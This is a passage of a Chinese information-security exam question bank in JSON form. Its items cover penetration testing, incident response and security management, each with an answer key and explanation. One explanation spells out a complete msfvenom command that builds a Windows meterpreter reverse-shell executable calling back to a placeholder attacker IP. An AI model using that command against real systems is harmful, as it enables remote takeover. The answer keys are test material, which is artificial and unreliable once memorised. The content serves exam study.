）。","o":["攻陷目标群体常访问的网站并植入恶意代码，等待目标'上钩'","直接攻击目标服务器","钓鱼邮件","暴力破解"],"a":0,"e":"\u003cb>水坑攻击：攻击者\u003cb>先攻陷目标人群常访问的第三方网站（'水坑'）并植入恶意脚本\u003c/b>，目标访问时被感染，隐蔽且难以溯源\u003c/b>。\u003cb>防护\u003c/b>：浏览器隔离、及时补丁、EDR检测。\u003cb>易错点\u003c/b>：'在猎物常喝水的地方下毒'。\u003cb>记忆\u003c/b>：'不追猎物，在猎物必经之路设伏'。"},{"c":"pentest","t":"s","q":"红队（Red Team）演练与普通渗透测试的主要区别是（　）。","o":["红队模拟真实攻击者多阶段攻击（含社工/物理/隐蔽），测试整体防御与检测响应能力；渗透测试侧重漏洞利用验证","没有区别","渗透测试更隐蔽","红队只测漏洞"],"a":0,"e":"\u003cb>红队=\u003cb>高仿真攻击模拟\u003c/b>：不限手段（技术+社工+物理）、多阶段、目标导向（打穿并验证蓝队检测响应），检验\u003cb>整体安全能力\u003c/b>；渗透测试通常在授权范围内验证具体漏洞\u003c/b>。\u003cb>易错点\u003c/b>：'红队考'检测响应+作战'，渗透考'漏洞+防护''。\u003cb>记忆\u003c/b>：'红队演'坏人怎么打进来'，渗透查'哪里能打进来''。"},{"c":"pentest","t":"s","q":"在授权渗透测试中，'被动信息收集'与'主动信息收集'的区别是（　）。","o":["被动=不直接接触目标（搜索引擎、证书透明日志、Whois、历史数据），主动=直接扫描/请求目标","被动要扫端口","主动不接触目标","两者相同"],"a":0,"e":"\u003cb>被动收集：\u003cb>不触碰目标\u003c/b>，利用搜索引擎（Google Hacking）、证书透明度（crt.sh）、Whois、Github泄露、历史DNS等；主动收集：\u003cb>直接与目标交互\u003c/b>（nmap扫描、目录爆破、指纹识别），风险更高且可能触发告警\u003c/b>。\u003cb>易错点\u003c/b>：'被动隐蔽、主动高效但暴露'。\u003cb>记忆\u003c/b>：'被动=隔岸观察，主动=登门探访'。"},{"c":"pentest","t":"s","q":"对于Linux系统的应急排查，执行命令收集信息时，应优先选择（　）。","o":["先收集易失数据（当前进程、网络连接、登录会话、内存）再查文件与日志","直接重启","先删文件","先改口令"],"a":0,"e":"\u003cb>应急优先采集\u003cb>易失性数据\u003c/b>（运行进程、网络连接、登录会话、已加载内核模块、计划任务），再收集持久数据（文件、日志、历史命令），避免操作破坏现场\u003c/b>；可先用\u003ccode>uname -a、ps、netstat、ss、last、history\u003c/code>等快照保存。\u003cb>易错点\u003c/b>：'先保全现场，再分析处置'。\u003cb>记忆\u003c/b>：'易失的先抓，磁盘的后拿'。"},{"c":"pentest","t":"s","q":"Metasploit中，'auxiliary'模块类别主要用于（　）。","o":["辅助功能（扫描、枚举、爆破、探测）不直接利用漏洞","生成木马","接收反弹","命令执行"],"a":0,"e":"\u003cb>msf中：\u003cb>exploit=漏洞利用、auxiliary=辅助（扫描/枚举/爆破/探测）、payload=载荷（shell）、post=后渗透\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'打点用exploit，侦察用auxiliary'。\u003cb>记忆\u003c/b>：'auxiliary=侦察兵，exploit=突击队'。"},{"c":"pentest","t":"s","q":"msfvenom生成Windows反弹木马的典型参数含义是（　）。","o":["-p指定payload、LHOST/LPORT指定回连地址端口、-f指定格式","-p指定端口扫描","-f格式化磁盘","LHOST是目标IP"],"a":0,"e":"\u003cb>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=端口 -f exe -o shell.exe\u003c/b>：-p选择payload，LHOST/LPORT是\u003cb>回连（反弹）到攻击机的地址端口\u003c/b>，-f输出格式\u003c/b>。\u003cb>易错点\u003c/b>：'LHOST是攻击机地址（被控端要连的地方）'。\u003cb>记忆\u003c/b>：'LHOST=回家地址（攻击机），目标拿着这地址来找你'。"},{"c":"pentest","t":"s","q":"关于暴力破解与字典攻击，下列说法正确的是（　）。","o":["字典攻击用常用口令表试，暴力破解穷举字符组合；两者都受锁定/限速/MFA限制","没有区别","字典攻击一定成功","暴力破解不需要时间"],"a":0,"e":"\u003cb>字典攻击：用\u003cb>常用口令/泄露口令库\u003c/b>试（成功率高、速度快）；暴力破解：\u003cb>穷举字符组合\u003c/b>（覆盖广但慢）；两者都会被\u003cb>锁定策略、验证码、MFA、限速\u003c/b>显著抑制\u003c/b>。\u003cb>易错点\u003c/b>：'强口令+锁定+MFA=爆破与字典的天敌'。\u003cb>记忆\u003c/b>：'字典靠'常见'，暴力靠'穷举'，MFA是它们的克星'。"},{"c":"pentest","t":"s","q":"Linux主机被入侵后，检查'历史命令记录'文件的价值是（　）。","o":["还原攻击者在shell中执行过的命令（/root/.bash_history），推断其行为","提高性能","清理磁盘","修改配置"],"a":0,"e":"\u003cb>/root/.bash_history等记录已执行命令，可\u003cb>还原攻击者操作\u003c/b>（下载了什么、改了哪些配置）；但攻击者可清空（history -c）或禁用记录，需结合日志/进程/时间线交叉验证\u003c/b>。\u003cb>易错点\u003c/b>：'历史命令是线索不是全部'。\u003cb>记忆\u003c/b>：'翻翻历史的账本，看坏人做过什么'。"},{"c":"pentest","t":"s","q":"在Web渗透中，'越权测试'的重点是（　）。","o":["修改请求中的ID/权限参数，验证服务端是否校验资源归属与角色权限","扫描端口","暴力破解","绕过验证码"],"a":0,"e":"\u003cb>越权测试：\u003cb>改ID/对象标识看能否访问他人数据（水平），改用高权限角色/接口看是否被拦截（垂直）\u003c/b>，核心是验证\u003cb>服务端鉴权\u003c/b>是否存在\u003c/b>。\u003cb>易错点\u003c/b>：'前端隐藏/按钮禁用≠安全，服务端校验才是真'。\u003cb>记忆\u003c/b>：'改个id试试、换个角色试试=越权三板斧'。"},{"c":"pentest","t":"m","q":"渗透测试的一般流程环节包括（　）。","o":["前期交互（授权与范围确认）","信息收集与漏洞扫描","漏洞验证与利用","报告编写与整改建议"],"a":[0,1,2,3],"e":"标准流程：\u003cb>前期交互→信息收集→威胁建模/漏洞分析→漏洞利用→后渗透→报告输出\u003c/b>。\u003cb>核心红线\u003c/b>：渗透测试必须获得\u003cb>书面授权\u003c/b>并在约定范围内进行，未授权的渗透测试属于违法行为。"},{"c":"pentest","t":"s","q":"渗透测试前进行子域名收集的主要目的是（　）。","o":["扩大资产测绘面，测试或边缘子域往往防护薄弱，是常见突破口","直接获取管理员密码","使目标服务器宕机","规避法律授权要求"],"a":0,"e":"\u003cb>子域名收集=资产边界扩展\u003c/b>：被遗忘的测试环境、老旧系统常缺少同等防护。常用手段：证书透明度日志（crt.sh）、DNS 字典枚举、搜索引擎语法、子域名爆破与存活验证。\u003cb>合规提醒\u003c/b>：一切动作以授权范围与书面同意为边界。\u003cb>记忆\u003c/b>：'主站啃不动，先逛后院'。"},{"c":"pentest","t":"s","q":"对 Web 目标做指纹识别（判断 CMS/框架/中间件）时，常用依据不包括（　）。","o":["目标管理员的家庭住址","特征路径与页面关键字（如 /wp-admin、默认报错页）","HTTP 响应头（Server、X-Powered-By）","favicon 图标的哈希与 HTML/JS 代码特征"],"a":0,"e":"\u003cb>技术指纹的依据：响应头、特征路径与文件、favicon 哈希、HTML/JS 特征、Cookie 名\u003c/b>，常用工具 Wappalyzer、whatweb。管理员的个人信息不属于技术指纹，也与授权测试目标无关。\u003cb>记忆\u003c/b>：'看头、看页、看图标，不看八卦'。"},{"c":"pentest","t":"m","q":"下列属于防范弱口令爆破的有效措施的有（　）。","o":["强制密码复杂度策略，并定期审计弱口令","设置登录失败锁定阈值与验证码","关键系统启用多因素认证","对外开放所有服务的登录入口，方便员工随时改密码"],"a":[0,1,2],"e":"\u003cb>防爆破三板斧：提高猜测成本（复杂度/MFA）、限制尝试（锁定/验证码/延时）、收敛暴露面（最小化登录入口）\u003c/b>，并配合爆破告警监控。开放所有登录入口是\u003cb>扩大攻击面\u003c/b>的错误做法。\u003cb>记忆\u003c/b>：'加成本、限次数、缩入口'。"},{"c":"mgmt","t":"s","q":"信息安全风险的三要素构成是（　）。","o":["资产、威胁、脆弱性","人、流程、技术","加密、认证、审计","软件、硬件、网络"],"a":0,"e":"\u003cb>资产有价值，威胁利用脆弱性，形成风险\u003c/b>（风险≈可能性×影响）。安全事件是风险被触发后的现实后果；控制措施作用于任一要素：消除威胁、修补弱点、降低资产暴露。风险评估即识别三要素并度量。"},{"c":"mgmt","t":"s","q":"威胁与脆弱性的区别是（　）。","o":["没有区别","威胁是潜在的危害来源，脆弱性是资产自身的弱点","威胁是弱点，脆弱性是攻击","两者都与资产无关"],"a":1,"e":"\u003cb>威胁=外/内部的潜在危害源（攻击团伙、病毒、误操作）；脆弱性=自身弱点（未打补丁、弱口令、配置错误）\u003c/b>。无脆弱性则威胁难以得逞，无威胁则弱点暂不暴露；管理重点是补弱点、降暴露、备响应。"},{"c":"mgmt","t":"s","q":"购买网络安全责任保险属于哪种风险处置策略？（　）","o":["风险规避","风险转移","风险降低","风险接受"],"a":1,"e":"\u003cb>风险转移：将部分损失后果转嫁给第三方\u003c/b>（保险、外包托管）。四策略对照：\u003cb>规避\u003c/b>=下线高风险业务；\u003cb>降低\u003c/b>=部署WAF/打补丁；\u003cb>接受\u003c/b>=影响可忽略时经管理层书面确认。实践中常组合使用。"},{"c":"mgmt","t":"s","q":"经过安全处置后仍然存在的风险称为（　）。","o":["零风险","剩余风险","系统风险","不可抗风险"],"a":1,"e":"\u003cb>剩余风险：处置后仍被组织接受并监控的风险\u003c/b>。安全是相对的，投入与残余风险需平衡；高等级剩余风险必须经管理层签批、持续监测并配套应急预案，且在风险登记册中动态维护、定期复评。"},{"c":"mgmt","t":"s","q":"依据标准检查清单快速过一遍控制项的风险评估方式是（　）。","o":["基线评估","详细评估","渗透测试","漏洞扫描"],"a":0,"e":"\u003cb>基线评估：对照等保、ISO27001等标准清单快速核查\u003c/b>，成本低、适合面上铺开；\u003cb>详细评估\u003c/b>对核心系统做资产-威胁-脆弱性的深入配对分析；组合方式（自评估+抽查+工具）最常用，每年至少一次或重大变更时开展。"},{"c":"mgmt","t":"s","q":"差异备份备份的是（　）。","o":["自上次完全备份以来的全部变化数据","自上次任意备份以来的变化数据","全部数据","仅系统文件"],"a":0,"e":"\u003cb>差异=上次完全备份以来所有变化\u003c/b>；\u003cb>增量=上次任意备份以来的变化\u003c/b>。差异恢复只需“完全+最近一次差异”，增量恢复需要“完全+历次增量”链条长、易断。勒索时代推荐3-2-1：3份数据、2种介质、1份离线异地。"},{"c":"mgmt","t":"s","q":"每周日做完全备份、每天做差异备份，周三中午故障后恢复需要的备份集是（　）。","o":["仅周日完全备份","周日完全备份+周三最近的差异备份","全部差异备份","最近一次差异备份"],"a":1,"e":"\u003cb>完全+最近一次差异即可恢复到周三状态\u003c/b>（两份介质）；若采用增量策略则需要“完全+N个增量”。关键提醒：备份必须定期恢复演练--未演练的备份等于没有备份（常见翻车：备份带毒、磁带读不出、权限丢失）。"},{"c":"mgmt","t":"s","q":"8块等容量磁盘组成RAID5，可用容量为（　）块盘。","o":["4","6","7","8"],"a":2,"e":"\u003cb>RAID5校验信息分布式存放，可用容量n-1（8-1=7）\u003c/b>，允许坏1块盘靠校验重建（RAID6允许坏2块）；RAID1为镜像（容量减半），RAID10（4盘起）兼顾性能与冗余。注意：\u003cb>RAID不是备份\u003c/b>--误删、病毒、勒索会同步写入阵列。"},{"c":"mgmt","t":"s","q":"RPO（恢复点目标）的含义是（　）。","o":["从中断到恢复服务的最长时间","能容忍的最大数据丢失时间量","服务器重启次数","备份窗口长度"],"a":1,"e":"\u003cb>RPO=可容忍的最大数据丢失量（用时间衡量），由备份/复制频率决定\u003c/b>；RTO=从中断到业务恢复的最长时间（SLA核心指标）。同城双活RPO趋近于0，异地异步复制的RPO等于复制间隔。先定RTO/RPO再选容灾方案。"},{"c":"mgmt","t":"s","q":"“两地三中心”容灾架构指的是（　）。","o":["三个生产中心同城运行","生产中心+同城中心+异地灾备中心","三个数据中心都不联网","仅一个中心加两份电费单"],"a":1,"e":"\u003cb>生产中心+同城中心（低延迟，双活/热备）+异地中心（防区域级灾难，冷/温备）\u003c/b>。容灾能力须靠定期演练验证（切换演练、断网拉练），只建不练=纸面容灾；国标GB/T 20988对灾备能力分级。"},{"c":"mgmt","t":"s","q":"手机号在页面展示为“138****5678”，属于（　）。","o":["静态脱敏","动态脱敏（展示层遮蔽）","数据加密","数据删除"],"a":1,"e":"\u003cb>动态脱敏：查询/展示时按角色实时遮蔽\u003c/b>（掩码、截断、哈希等）；\u003cb>静态脱敏：数据落地前整体替换，用于开发测试环境整库脱敏\u003c/b>。测试环境使用真实生产数据是重大泄露隐患；日志、报错信息同样需要脱敏。"},{"c":"mgmt","t":"s","q":"数据生命周期的正确顺序是（　）。","o":["采集-传输-存储-使用-共享-销毁","存储-采集-销毁-共享","传输-销毁-采集-存储","采集-销毁-传输-存储"],"a":0,"e":"六阶段\u003cb>采集、传输、存储、使用（处理）、共享（交换）、销毁\u003c/b>，各阶段对应控制：最小必要与授权采集、传输加密、存储加密与访问控制、处理脱敏与审计、共享评估与合同约束、销毁需物理销毁或多次覆写防恢复。"},{"c":"mgmt","t":"s","q":"“Plan-Do-Check-Act”体现的安全管理体系思想是（　）。","o":["PDCA持续改进","一次到位","重技术轻管理","黑白名单"],"a":0,"e":"\u003cb>PDCA循环：建立体系->运行实施->审核检查->纠正改进，螺旋上升\u003c/b>。等保、ISO27001均基于该思想。业内常说“三分技术、七分管理”--制度、流程、人员与意识决定安全上限，技术只是工具。"},{"c":"mgmt","t":"s","q":"员工离职时信息安全方面的正确处理是（　）。","o":["保留账号一个月以便交接","立即回收账号权限与门禁，收回设备并撤销证书/密钥","无需处理","将权限转给其亲友"],"a":1,"e":"\u003cb>离职即时回收：账号、权限、门禁、设备、VPN/证书/密钥\u003c/b>，流程清单化并要求HR-IT联动限时完成。配套：入职签保密协议、按岗授权、定期权限复核；内部人员（误操作+恶意）是高发威胁源。"},{"c":"mgmt","t":"s","q":"机房防静电的正确措施是（　）。","o":["铺设防静电地板并良好接地","穿毛线衫作业","加大空调风力","用湿抹布擦设备"],"a":0,"e":"机房物理安全：防静电地板/接地/操作佩戴防静电腕带，另配套\u003cb>门禁与监控、防火防水防雷、UPS与精密空调\u003c/b>、来访登记陪同、介质安全存放与消磁/物理销毁。物理安全是“近场攻击”的最后防线。"},{"c":"mgmt","t":"s","q":"漏洞管理的正确闭环流程是（　）。","o":["发现-定级-修复-验证-记录归档","发现-删除漏洞-结案","扫描-打印报告","修复-忘记"],"a":0,"e":"\u003cb>发现（扫描/情报/渗透）->定级（CVSS×资产重要性）->修复（补丁/缓解，高危限时SLA）->验证（复测）->台账归档\u003c/b>。无法立即升级的老系统用“虚拟补丁”（WAF规则）争取窗口期；每月复盘漏洞趋势与超期项。"},{"c":"mgmt","t":"s","q":"生产环境实施变更前必须准备的是（　）。","o":["回退方案","庆祝方案","新的机房钥匙","更大的硬盘"],"a":0,"e":"变更流程：申请->影响评估->审批->窗口期实施->验证->\u003cb>回退预案\u003c/b>。变更是大规模故障第一诱因：双人复核、灰度发布、变更后观察期；紧急变更走快速通道但事后补审。配置基线（CMDB）支撑回退与审计。"},{"c":"mgmt","t":"s","q":"软件供应链安全的核心实践不包括（　）。","o":["使用官方源并锁定依赖版本","维护SBOM（软件物料清单）并持续跟踪组件漏洞","对第三方组件做准入评估与持续监督","把源码完整上传到公开仓库方便协作"],"a":3,"e":"供应链安全：\u003cb>官方来源、锁版本、SBOM清单、组件漏洞持续跟踪（Log4j2事件即为教训）、供应商准入评估与合同约束、外包人员同内部管控\u003c/b>。D行为典型反面案例；第三方事故对外你仍需承担连带责任。"},{"c":"mgmt","t":"s","q":"BCP（业务连续性计划）与DRP（灾难恢复计划）的区别是（　）。","o":["完全相同","BCP关注维持关键业务运行，DRP关注IT系统灾难后的恢复","BCP只管IT系统","DRP只管人员安全"],"a":1,"e":"\u003cb>BCP：在事件/灾难期间维持关键业务连续运行的全局性计划\u003c/b>（含人员、设施、IT、供应链、对外沟通）；\u003cb>DRP：IT系统灾难后的技术恢复方案\u003c/b>（RTO/RPO、备份策略、灾备切换）。DRP是BCP的子集。BCP需要高层支持、全员参与和定期演练。"},{"c":"mgmt","t":"s","q":"风险评估中，资产识别的首要步骤是（　）。","o":["评估威胁","编制资产清单并分类标识（硬件/软件/数据/人员/服务）","部署防火墙","购买保险"],"a":1,"e":"\u003cb>资产识别：清点所有信息资产（硬件、软件、数据、文档、人员、服务等）并赋值\u003c/b>。资产价值决定保护等级和投入。资产分类分级后才能进行威胁分析（谁可能攻击）和脆弱性分析（自身弱点在哪），最终计算风险值。没有资产清单的风险评估缺乏基础。"},{"c":"mgmt","t":"s","q":"安全意识培训中最有效的内容形式是（　）。","o":["只读法规文件","结合真实攻击案例的钓鱼模拟、场景化互动与安全事件复盘","只听讲座","只做笔试"],"a":1,"e":"\u003cb>有效的安全意识培训：钓鱼邮件模拟（实测点击率并针对性补训）、安全事件复盘（讲身边案例）、场景化互动（怎么识别、怎么处理）\u003c/b>。人是最薄弱环节也是最后一道防线，社会工程学攻击的成功率远高于技术漏洞利用。培训应常态化（每季度至少一次）。"},{"c":"mgmt","t":"s","q":"等保合规中，三级系统对安全审计日志的要求是（　）。","o":["不需要审计","审计记录内容至少包括事件日期、用户、事件类型、事件是否成功，且保存6个月以上","只保存3天","审计记录不需要记录成功事件"],"a":1,"e":"\u003cb>等保三级要求审计记录包括：事件日期、时间、用户、事件类型、事件结果（是否成功）\u003c/b>，审计记录保存不少于6个月，且应保护审计记录不被篡改或删除。日志集中管理、定期审查是审计有效性的关键。"},{"c":"mgmt","t":"s","q":"供应链攻击“SolarWinds事件”的核心教训是（　）。","o":["软件更新机制可能被攻破用于分发恶意更新","只需要更强的密码","不需要关注第三方安全","只用开源软件即可避免"],"a":0,"e":"\u003cb>SolarWinds攻击者入侵构建系统，在Orion平台更新包中植入后门（SUNBURST）\u003c/b>，通过官方更新渠道分发给约18000个客户。核心教训：信任供应链不等于安全，需验证软件完整性（签名校验）、SBOM追踪组件、构建环境隔离、监控异常出站行为。"},{"c":"mgmt","t":"s","q":"关于数据分类分级，以下说法错误的是（　）。","o":["按数据重要性分为公开、内部、机密、绝密等不同等级","不同级别的数据应采取不同强度的保护措施","所有数据都应按最高安全级别保护","分类应定期复评以适应业务变化"],"a":2,"e":"\u003cb>所有数据按最高级别保护是过度投入且不可行\u003c/b>。数据分类分级的核心理念是“按级施策”：公开数据低强度保护、机密数据高强度保护（加密、访问控制、审计）。分类应随业务变化动态调整，同时数据脱敏和最小必要原则降低泄露影响。"},{"c":"mgmt","t":"s","q":"ISO 27001与等保2.0的关系是（　）。","o":["互不相干，选一个即可","等保是法定合规底线，ISO 27001是自愿性体系化提升，两者互补","ISO 27001替代等保","等保替代ISO 27001"],"a":1,"e":"\u003cb>等保是国内法定要求（法律强制），所有运营者在合规层面必须满足\u003c/b>；\u003cb>ISO 27001是国际自愿性认证，体现信息安全管理体系的成熟度\u003c/b>。两者控制域有大量重叠（访问控制、审计、密码管理等），通过ISO 27001可在很大程度上满足等保的技术要求。"},{"c":"mgmt","t":"s","q":"企业信息安全制度建设中，“三同步”原则是指（　）。","o":["同步加密、同步认证、同步审计","同步规划、同步建设、同步运行（安全与信息系统）","同步开发、同步测试、同步上线","同步备份、同步监控、同步恢复"],"a":1,"e":"\u003cb>三同步原则：安全设施与信息系统同步规划、同步建设、同步运行\u003c/b>，是等保2.0的核心要求。信息安全不能是事后补课：规划阶段做安全设计、建设阶段同步实施、运行阶段持续运营。事后加固的成本和风险远高于同步建设。"},{"c":"mgmt","t":"s","q":"关于等保测评机构的说法正确的是（　）。","o":["任何公司都可以做等保测评","测评机构须获得国家认可资质，且测评人员需持证上岗","测评机构由被测单位自行指定","测评不需要实地检查"],"a":1,"e":"\u003cb>等保测评机构须经公安部核准，测评人员需持测评师证书\u003c/b>（初级/中级/高级）。三级及以上系统推荐选择机构等级不低于二级的测评机构。测评不是简单走过场：包括访谈、核查配置、现场测试（端口扫描、漏洞扫描等），最终出具符合/不符合项的测评报告。"},{"c":"mgmt","t":"s","q":"ISO 27001中“适用性声明（SoA）”的作用是（　）。","o":["声明公司名称","说明每项控制措施的适用状态及选择的理由（适用/不适用及理由/补充措施）","声明所有数据公开","确认网络连接正常"],"a":1,"e":"\u003cb>SoA（Statement of Applicability）是ISO 27001的核心文档\u003c/b>，对Annex A中每项控制措施逐一说明：是否适用、不适用需给出合理理由、适用的还需说明现有实施措施及可能的风险接受。SoA是外部审核和内部管理的重要依据。"},{"c":"mgmt","t":"s","q":"信息安全管理中“最小权限原则”的正确理解是（　）。","o":["所有用户权限为零","用户仅被授予完成工作所必需的最小权限集","仅管理员有权限","权限越少越好直到影响业务"],"a":1,"e":"\u003cb>最小权限原则（Principle of Least Privilege）\u003c/b>：用户、进程、系统的权限仅限于完成其职责所需的最小范围，多余的一律不给。这不是“权限越少越好”，而是“刚好够用且不超出”。实践：按岗授权、定期权限复核、离职即时回收、管理员用普通用户日常操作。"},{"c":"mgmt","t":"f","q":"制定了完善的安全制度和技术措施后，就不需要再做安全意识培训和应急演练了。","a":1,"e":"错误。技术和管理措施是基础，但人的因素是安全链中最薄弱的环节。社会工程学、钓鱼攻击针对的是人而非技术缺陷。安全意识培训和应急演练需要常态化持续进行，做到“制度+技术+人员”三位一体才能有效降低安全风险。"},{"c":"mgmt","t":"f","q":"RAID5阵列可以替代数据备份，因为它的冗余机制可以在一块磁盘损坏后恢复数据。","a":1,"e":"错误。RAID提供的是可用性（容错），不是备份。误删除、勒索软件、逻辑错误、自然灾害等会同步影响RAID中所有磁盘。\u003cb>3-2-1备份策略\u003c/b>：3份数据副本、2种不同介质、1份离线异地，才是可靠的数据保护。RAID和备份是互补的。"},{"c":"mgmt","t":"s","q":"零信任架构（Zero Trust）的核心原则是（　）。","o":["默认信任内网流量","永不信任、始终验证，基于身份和上下文动态授权","仅在边界部署防火墙","信任所有已认证用户"],"a":1,"e":"\u003cb>零信任=Never Trust, Always Verify\u003c/b>：不再以网络边界（内网=安全）为信任基础，每次访问请求都需验证身份、设备状态、上下文。核心组件：身份代理、策略引擎、动态策略决策。NIST SP 800-207是零信任架构权威参考。适合云原生和远程办公场景。"},{"c":"mgmt","t":"s","q":"安全开发生命周期（SDL）的含义是（　）。","o":["只在上线后做安全测试","将安全活动嵌入软件开发的每个阶段（需求-设计-编码-测试-部署-运维）","仅由安全团队负责","只关注代码审计"],"a":1,"e":"\u003cb>SDL=Security Development Lifecycle\u003c/b>：需求阶段做威胁建模、设计阶段做安全架构评审、编码阶段遵循安全编码规范、测试阶段做SAST/DAST/渗透测试、部署阶段做安全配置、运维阶段做监控和响应。DevSecOps是SDL在CI/CD中的实践落地。"},{"c":"mgmt","t":"s","q":"SOC 2（System and Organization Controls 2）审计报告主要针对（　）。","o":["财务报表","云服务和第三方服务商的安全性、可用性、处理完整性、保密性和隐私","内部员工绩效","硬件采购清单"],"a":1,"e":"\u003cb>SOC 2 Type I评估系统设计，Type II评估运行有效性（通常6-12个月）\u003c/b>。五个信任服务标准：安全性、可用性、处理完整性、保密性、隐私。企业选择SaaS/云服务商时应要求提供SOC 2报告以评估其安全管控能力。"},{"c":"mgmt","t":"s","q":"数据防泄露（DLP）系统的三种部署形态是（　）。","o":["仅网络部署","网络端、终端、云端三种部署形态","仅终端部署","仅云部署"],"a":1,"e":"\u003cb>网络DLP：监控邮件/Web/FTP等出站通道\u003c/b>；\u003cb>终端DLP：监控U盘拷贝、打印、截屏、邮件发送\u003c/b>；\u003cb>云DLP：集成SaaS平台（如Office 365/DingTalk）监控云端数据流转\u003c/b>。三种形态互补，缺一不可。DLP策略需根据数据分类分级设置不同的检测规则和响应动作。"},{"c":"mgmt","t":"s","q":"隐私影响评估（PIA）的核心目的是（　）。","o":["加速产品上线","在处理个人信息前评估对个人权益的影响并采取措施","增加用户注册流程","提升服务器性能"],"a":1,"e":"\u003cb>PIA（Privacy Impact Assessment）是GDPR和《个人信息保护法》共同要求\u003c/b>：在开展可能对个人权益有重大影响的个人信息处理活动前，系统评估处理目的、方式、必要性、风险及保护措施。PIA应形成文档并留存，作为合规审计证据。"},{"c":"mgmt","t":"s","q":"NIST网络安全框架（CSF）的五个核心功能按顺序是（　）。","o":["识别-保护-检测-响应-恢复（Identify-Protect-Detect-Respond-Recover）","检测-识别-响应-保护-恢复","保护-检测-恢复-识别-响应","响应-检测-保护-识别-恢复"],"a":0,"e":"\u003cb>NIST CSF五大功能：识别（了解资产和风险）→保护（实施安全措施）→检测（发现安全事件）→响应（采取行动控制影响）→恢复（恢复正常运行）\u003c/b>。框架不规定具体技术，而是提供统一的 cybersecurity 语言和改进路径。美国联邦机构和越来越多国际企业采用。"},{"c":"mgmt","t":"s","q":"以下哪项不属于数据安全技术手段？（　）","o":["透明加密（文件级自动加解密）","脱敏（静态/动态）","数据备份与恢复","增加员工工作时间"],"a":3,"e":"\u003cb>数据安全核心技术：加密（传输加密+存储加密+透明加密）、脱敏（静态脱敏用于测试环境、动态脱敏用于生产展示）、访问控制、审计日志、数据备份与恢复、数字水印（溯源泄露源）\u003c/b>。D选项与数据安全完全无关。"},{"c":"mgmt","t":"s","q":"企业开展信息安全风险评估的频率要求一般是（　）。","o":["做一次就够了","每年至少一次，重大变更时需重新评估","每十年一次","不需要评估"],"a":1,"e":"\u003cb>等保要求三级系统每年至少测评一次\u003c/b>，企业自身风险评估也应至少每年一次。触发重新评估的情形：信息系统重大变更、重大安全事件后、法律法规变化、业务模式调整、发现新的威胁情报。风险评估是动态过程而非一次性工作。"},{"c":"mgmt","t":"s","q":"安全运营中“纵深防御”（Defense in Depth）的含义是（　）。","o":["只在外网边界部署防火墙","在多个层面部署多层安全控制，任一层被突破还有其他层保护","所有设备安装同一款杀毒软件","只做漏洞扫描"],"a":1,"e":"\u003cb>纵深防御：网络边界（防火墙/IPS）→主机层（EDR/补丁）→应用层（WAF/代码审计）→数据层（加密/DLP）→人员层（培训/意识）\u003c/b>，层层设防。任何单点被突破，仍有其他层减缓攻击。安全没有银弹，纵深防御是安全架构的基本原则。"},{"c":"mgmt","t":"s","q":"安全事件应急响应预案中，“预警”阶段的工作是（　）。","o":["恢复数据","通过安全监控和威胁情报提前发现威胁迹象并进行研判","直接断网","删除日志"],"a":1,"e":"\u003cb>预警（Preparation/Detection）：日常安全监控、威胁情报接入、异常检测、安全态势感知\u003c/b>，发现可疑迹象后进行研判分级。预警做得好可以提前遏制威胁，将事件消灭在萌芽状态。SOC 7x24值班的核心价值就在预警环节。"},{"c":"mgmt","t":"s","q":"云安全责任共担模型中，云服务商（CSP）始终负责的是（　）。","o":["客户数据的访问控制","物理基础设施安全和底层虚拟化平台安全","客户的应用代码安全","客户的口令管理"],"a":1,"e":"\u003cb>IaaS模型下：CSP负责物理层+虚拟化层，客户负责OS以上所有层\u003c/b>；\u003cb>PaaS：CSP多负责中间件/运行时\u003c/b>；\u003cb>SaaS：CSP负责大部分，客户负责数据/身份\u003c/b>。无论哪种模型，CSP始终负责物理安全和底层基础设施。客户必须清楚自己负责的边界。"},{"c":"mgmt","t":"s","q":"威胁情报（CTI）在安全运营中的主要作用是（　）。","o":["替代防火墙","提供关于攻击者、攻击手法、指标（IoC）的上下文信息，辅助检测和响应决策","自动修复漏洞","生成财务报表"],"a":1,"e":"\u003cb>威胁情报类型：战略情报（宏观趋势）、战术情报（TTP）、操作情报（攻击活动）、技术情报（IoC如IP/域名/哈希）\u003c/b>。整合到SIEM/EDR/XDR可提升告警准确率、加速研判。开源情报（OSINT）是重要来源，但需验证质量。威胁情报平台（TIP）用于管理和关联。"},{"c":"mgmt","t":"s","q":"关于个人信息匿名化，以下说法正确的是（　）。","o":["仅删除姓名即可","经过处理使个人信息无法识别特定自然人且不能复原，则不再属于个人信息","匿名化后不需要做任何保护","匿名化就是加密"],"a":1,"e":"\u003cb>匿名化（Anonymization）是不可逆的\u003c/b>，处理后不再属于个人信息，不受个保法约束。\u003cb>去标识化（De-identification）是可逆的\u003c/b>，仍属于个人信息。去标识化需结合技术和管理措施保障安全，且仅向授权方提供重标识方法。"},{"c":"mgmt","t":"s","q":"在DevSecOps实践中，安全扫描应集成在CI/CD流水线的哪个阶段？（　）","o":["仅在上线后","代码提交、构建、部署等每个阶段都集成相应的安全检查","仅在编码阶段","不需要集成"],"a":1,"e":"\u003cb>DevSecOps将安全左移：编码阶段IDE安全插件+Git预提交Hook、构建阶段SAST+SCA（依赖检查）、测试阶段DAST+IAST、部署阶段容器镜像扫描+配置检查、运行阶段RASP+WAF+监控\u003c/b>。自动化+流水线集成是关键，减少人为遗漏。"},{"c":"mgmt","t":"s","q":"安全管理制度文件的层级从高到低通常为（　）。","o":["方针-管理制度-操作规程-记录表单","操作规程-方针-记录表单-管理制度","管理制度-方针-操作规程","记录表单-方针-管理制度-操作规程"],"a":0,"e":"\u003cb>四层体系：一级方针（安全总纲/总政策）→二级制度（各项管理制度如访问控制、密码管理）→三级规程（操作细则/SOP）→四级记录（日志、表单、报告）\u003c/b>。文件需版本控制、定期评审（至少每年）、作废文件回收管理。制度不是摆设，要落地执行才有价值。"},{"c":"mgmt","t":"s","q":"等保2.0标准体系中，GB/T 25058是（　）。","o":["等级保护基本要求","网络安全等级保护实施指南","等级保护测评要求","等级保护设计技术要求"],"a":1,"e":"\u003cb>GB/T 25058=《网络安全等级保护实施指南》\u003c/b>，指导如何落地实施等保要求。配套体系：\u003cb>GB/T 22239=基本要求\u003c/b>（最核心）、\u003cb>GB/T 28448=测评要求\u003c/b>、\u003cb>GB/T 25070=安全设计技术要求\u003c/b>。等保2.0覆盖云安全、物联网、工控系统、移动互联等新技术新应用。"},{"c":"mgmt","t":"s","q":"关于数据销毁，以下说法正确的是（　